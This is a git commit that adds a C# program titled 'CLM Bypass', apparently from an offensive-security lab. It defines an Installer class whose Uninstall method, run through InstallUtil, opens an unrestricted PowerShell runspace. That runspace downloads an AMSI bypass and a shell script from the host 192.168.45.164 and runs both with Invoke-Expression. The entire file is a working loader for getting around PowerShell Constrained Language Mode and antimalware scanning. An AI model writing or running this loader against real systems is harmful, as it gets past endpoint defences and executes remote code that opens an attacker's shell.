31b7a96d7daada62585fd05ec49ca9d7e4eac890
Murd0cK <93411338+fmelipin@users.noreply.github.com>
2025-05-13 11:50:59 -0400

    Add files via upload

---
+++ CLM Bypass/CLM_Bypass/Program.cs
@@ -0,0 +1,35 @@
+﻿using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Configuration.Install;
+
+namespace CLM_Bypass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("This is the main method");
+        }
+    }
+
+    [System.ComponentModel.RunInstaller(true)]
+    public class Loader : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            string payload = "Invoke-Expression (Invoke-WebRequest -Uri 'http://192.168.45.164/amsi.txt' -UseBasicParsing | Select-Object -ExpandProperty Content); " +
+                             "$scriptContent = [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri 'http://192.168.45.164/shell.ps1' -UseBasicParsing).Content); " +
+                             "Invoke-Expression $scriptContent";
+
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+            ps.AddScript(payload);
+            ps.Invoke();
+            rs.Close();
+        }
+    }
+}
+
